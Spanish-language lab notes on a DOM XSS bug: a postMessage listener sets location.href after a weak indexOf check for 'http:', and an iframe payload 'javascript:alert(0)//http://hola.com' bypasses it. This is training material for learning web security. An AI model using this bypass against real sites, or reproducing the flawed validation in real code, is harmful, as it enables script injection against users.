# XSS DOM con Web Messages y URL JavaScript 

Tags: #XSS-DOM #JavaScript 

```bash 
En este lab se explota una vulnerabilidad de tipo DOM XSS basada en redirección, donde la aplicación escucha mensajes entrantes mediante postMessage y utiliza su contenido como destino para un cambio de página usando 'location.href'. Aunque intenta validar que la URL comienza con http o https, el uso incorrecto de indexOf permite eludir la comprobación.

- JavaScript indexOf: Retorna el primer índice en el que se puede encontrar un elemento dado en el array, ó retorna -1 si el elemento no esta presente
```

```javascript 
// Código donde se acontece la inyección 

	<script>
		window.addEventListener('message', function(e) {
			var url = e.data;
			if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
				location.href = url;
			}
		}, false);
	</script>
```

```javascript 
// Colocando algo a la izquiera o derecha de http o https la función lo hace válido ya que al final es mayor a -1

<iframe src="https://web.com/" onload='this.contentWindow.postMessage("javascript:alert(0)//http://hola.com", "*")'></iframe>


Notas:
	1. Colocar la función print(0) en lugar de alert(0)
	2. javascript es usado cuando se tiene un href 
```